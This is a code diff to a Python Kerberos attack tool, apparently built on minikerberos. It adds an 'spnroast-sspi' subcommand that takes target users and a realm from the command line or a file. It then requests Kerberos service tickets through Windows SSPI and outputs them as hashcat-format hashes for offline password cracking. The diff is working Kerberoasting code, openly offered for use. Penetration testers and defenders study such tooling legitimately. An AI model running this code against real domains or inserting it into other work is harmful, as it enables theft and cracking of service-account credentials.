@@ -12,6 +12,7 @@ from minikerberos import logger as kerblogger
 from minikerberos.security import *
 from minikerberos.common import *
 from minikerberos.communication import *
+
 import ntpath
 import logging
 import getpass
@@ -94,6 +95,11 @@ def run():
 	spnroast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	spnroast_group.add_argument('-e','--etype', default=-1, const=-1, nargs='?', choices= [23, 17, 18, -1], type=int, help = 'Set preferred encryption type. -1 for all')
 
+	spnroastsspi_group = subparsers.add_parser('spnroast-sspi', help='Perform spn roasting (aka kerberoasting)')
+	spnroastsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
+	spnroastsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
+	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
+	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 
 	args = parser.parse_args()
 
@@ -113,8 +119,77 @@ def run():
 		msldaplogger.setLevel(logging.DEBUG)
 
 	#ksoc = KerberosSocket(args.target)
+	
+	if args.command == 'spnroast-sspi':
+		try:
+			from winsspi.sspi import KerberoastSSPI
+		except ImportError:
+			raise Exception('winsspi module not installed!')
+			
+		if not args.targets and not args.user:
+			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
+		
+		targets = []
+		if args.targets:
+			with open(args.targets, 'r') as f:
+				for line in f:
+					line = line.strip()
+					domain = None
+					username = None
+					if line.find('/') != -1:
+						#we take for granted that usernames do not have the char / in them!
+						domain, username = line.split('/')
+					else:
+						username = line
 
-	if args.command == 'spnroast':
+					if args.realm:
+						domain = args.realm
+					else:
+						if domain is None:
+							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+					
+					spn_name = '%s@%s' % (username, domain)
+					targets.append(spn_name)
+					
+		if args.user:
+			for user in args.user:
+				domain = None
+				username = None
+				if user.find('/') != -1:
+					#we take for granted that usernames do not have the char / in them!
+					domain, username = user.split('/')
+				else:
+					username = user
+
+				if args.realm:
+					domain = args.realm
+				else:
+					if domain is None:
+						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
+				spn_name = '%s@%s' % (username, domain)
+				targets.append(spn_name)
+		
+		results = []
+		for spn_name in targets:
+			ksspi = KerberoastSSPI()
+			ticket = ksspi.get_ticket_for_spn(spn_name)
+			print(ticket)
+			results.append(TGSTicket2hashcat(ticket))
+			
+		if args.out_file:
+			with open(args.out_file, 'w') as f:
+				for thash in results:
+					f.write(thash + '\r\n')
+
+		else:
+			for thash in results:
+				print(thash)
+
+		logging.info('SSPI based Kerberoast complete')
+		
+		
+	
+	elif args.command == 'spnroast':
 		if not args.targets and not args.user:
 			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
 		targets = []
